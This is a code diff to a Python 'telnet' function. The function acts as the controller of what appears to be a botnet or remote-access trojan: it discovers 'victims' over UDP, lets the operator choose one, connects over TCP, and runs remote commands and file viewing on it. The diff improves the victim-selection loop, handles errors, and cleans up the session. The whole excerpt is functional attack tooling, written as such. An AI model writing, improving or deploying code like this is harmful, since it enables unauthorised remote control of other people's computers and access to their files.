@@ -44,14 +44,20 @@ def telnet():
         s = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
         search_bot(udp_sock, address)  # searching for new victims, only one second every time
 
+        while len(address) == 0:
+            search_bot(udp_sock, address)
+
         ''' printing all connected victims'''
         for x in range(0, len(address)):
             print(f"[{x + 1}] - {address[x]}")
 
-        while(1):
+        while 1:
             index = input(f"Select Victim: ")   # choosing the victim
-            if int(index) <= len(address) and int(index) > 0:
-                break
+            try:
+                if int(index) <= len(address) and int(index) > 0:
+                    break
+            except ValueError:
+                print("Enter an integer")
         s.connect((address[int(index) - 1], TCP_PORT))
 
         while 1:
@@ -68,7 +74,8 @@ def telnet():
                 view_file(command, output)
                 continue
             print(output.decode())
-
+        address.remove(address[int(index) - 1])
+        s.close()
 
 if __name__ == '__main__':
     telnet()
